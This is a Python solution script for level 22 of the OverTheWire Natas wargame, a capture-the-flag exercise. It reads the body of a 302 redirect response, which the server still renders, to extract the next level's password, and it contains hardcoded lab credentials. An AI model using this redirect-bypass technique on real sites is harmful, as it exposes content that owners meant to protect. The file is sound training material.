from bs4 import BeautifulSoup
import requests
import re

def make():
    res = requests.get(url=url,auth=lvl_pass, params=my_params, cookies=my_cookies)
    #prevent the redirect. Or rather, inspect the redirect contents since the script still executes
    soup = BeautifulSoup(res.history[0].text, 'html.parser')
    return (res, soup)

def writeResponse(enumerate = ''):
    with open(f'./response{enumerate}.html', 'w') as browserFile:
        browserFile.write(soup.prettify())


url = 'http://natas22.natas.labs.overthewire.org'
lvl_pass = requests.auth.HTTPBasicAuth('natas22','91awVM9oDiUGm33JdzM7RVLBS8bz9n0s')
my_cookies = {"PHPSESSID":'kij2rv5fvgd4v22ekal24idbj7'}
my_params = {"revelio":"true","admin":"1","debug":"true"}

res, soup = make()
print(re.search(r"Password: [a-zA-Z0-9]{32}", soup.find("div",id="content").text)[0][10:])

writeResponse()

'''
The PHP header function with location sends a 302 code that the browser redirects,
but the script still executes. And since it's the BROWSER redirecting, it's just a simple
case of making it not do that.

Username: natas23
Password: qjA8cOoKFTzJhtV0Fzvt92fgvxVnVRBj
'''
